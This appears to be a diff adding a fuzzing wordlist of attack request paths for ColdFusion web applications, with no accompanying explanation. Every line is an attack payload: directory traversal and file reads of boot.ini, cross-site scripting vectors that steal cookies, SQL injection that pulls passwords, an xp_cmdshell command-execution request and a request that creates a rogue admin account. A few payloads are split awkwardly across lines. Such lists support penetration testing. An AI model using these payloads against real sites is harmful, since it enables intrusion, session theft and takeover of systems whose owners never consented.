@@ -1,0 +1,44 @@
+cfdocs/expeval/exprcalc.cfm?OpenFilePath=c:\boot.ini
+jgrox/arbitrary.cfm?>'"><script>alert('BTINS-XSS')</script>
+admin/ adduser.cfm?FTVAR_FIRSTNAMEFRM=God&FTVAR_LASTNAMEFRM=God&FTVAR_EMAILADDRESSFRM=Attackeracker.com&FTVAR_USERNAMEFRM=attacker&FTVAR_PASSWORDFRM=coolpass&FTVAR_PASSWORD2FRM=coolpass&FTVAR_USERFORUMSFRM=0&FTVAR_USERTYPEFRM=g&FTVAR_USERLEVELFRM=0&FTVAR_STATUSFRM=1&FTVAR_CITYFRM=&FTVAR_STATEFRM=70&FTVAR_COUNTRYFRM=36&FTVAR_SCRIPTRUN=self.close%28%29%3B&FTVAR_RETURNERROR=Yes&FT_ACTION=adduser
+forum/usersearchresults.cfm?keyword=<script>alert(document.cookie)</script>&FT_ACTION=SearchUsers
+docs/showtemp.cfm?TYPE=JPEG&FILE=c:\boot.ini 
+docs/showtemp.cfm?TYPE=JPEG&FILE=../../../../../../../../../../../../../../../../../../ boot.ini%00
+index.cfm?Mode=debug
+../../../../../../../.cfm.%00<A%20HREF=http://www.microsoft.com>Microsoft%20Site
+.cfm%00<IMG%20SRC="http://www.google.co.uk/intl/en_uk/images/logo.gif">
+.cfm%00<IMG%20SRC="javascript:alert('haked')"
+.cfm%00<XML%20SRC="javascript:alert('XSS');">
+.cfm%00<STYLE%20type="text/css">BODY{background:url("javascript:alert('XSS')")}</STYLE>
+.cfm%00<STYLE>@im\port'\ja\vasc\ript:alert("XSS")';</STYLE>
+.cfm%00<TABLE%20BACKGROUND="javascript:alert('XSS')">
+.cfm%00<IFRAME%20SRC=javascript:alert('XSS')></IFRAME>
+.cfm%00<BODY%20ONLOAD=alert('XSS')>
+.cfm%00<IMG%20SRC="jav&#x0D;ascript:alert('XSS');">
+.cfm%00<IMG%20SRC=JaVaScRiPt:alert(&quot;XSS&quot;)>
+<BODY%20ONLOAD=alert('XSS')>.cfm
+forum/forum.cfm?FID=<script>JavaScript:alert(document.cookie);</script>
+forum/user.cfm?UID=<script>JavaScript:alert(document.cookie);</script>
+forum/thread.cfm?TID=<script>JavaScript:alert(document.cookie);</script>
+forum/search.cfm?PostDate=<script>JavaScript:alert(document.cookie);</script>
+forums/index.cfm?page=[XSS]
+index.cfm?fuseaction=page.viewPage&pageID=1&nodeID=1[SQL]
+index.cfm?fuseaction=page.viewPage&pageID=1[SQL]
+index.cfm?fuseaction=Document.showDocumentSection&sortby=PublishDate&startrow=8&topicOnly=&topicRadio=&topic=&subTopic=&docTitle=&docAuthor=&publishState=&docDescription=&docPublishYear=&presentationSite=&parentid=16&ID=1[SQL]
+index.cfm?fuseaction=Document.showDocumentSection&sortby=PublishDate&startrow=8&topicOnly=&topicRadio=&topic=&subTopic=&docTitle=&docAuthor=&publishState=&docDescription=&docPublishYear=&presentationSite=&parentid=[SQL]
+index.cfm?page=[SQL]
+printer_friendly.cfm?id=[SQL]
+document/docWindow.cfm?fuseaction=document.viewDocument&documentid=1&documentFormatId=[SQL]
+search.cfm?q=<XSS>
+pagename.cfm?id=122<insert non-interger character>
+dex.cfm?dspw=login&message=[code]
+highwall/endpoint_edit.cfm?EndPointID=29;exec%2
+0master..xp_cmdshell%20%22echo%201%20%3E%20c:\1.txt%22--
+insertorder.cfm?CFID=123&CFTOKEN=1 union select 1,2,3,password,5,6,7,8,9,10,11,12 from params"having 1=1
+forum/include/error/autherror.cfm?errorcode=1&FTVAR_LINKP=[xss]
+forum/include/common/comfinish.cfm?FTRESULT.errorcode=0&FTVAR_SCRIPTRUN=[xss]
+blog/include/common/comfinish.cfm?FTRESULT.errorcode=0&FTVAR_SCRIPTRUN=[xss]
+forum/include/error/autherror.cfm?FTVAR_URLP=x&errorcode=[SQL_INJ]
+highwall/device_ap_detail.cfm?NetworkID=22%20se
+lect%20union%20null
+highwall/building_view.cfm?BuildingID=1'
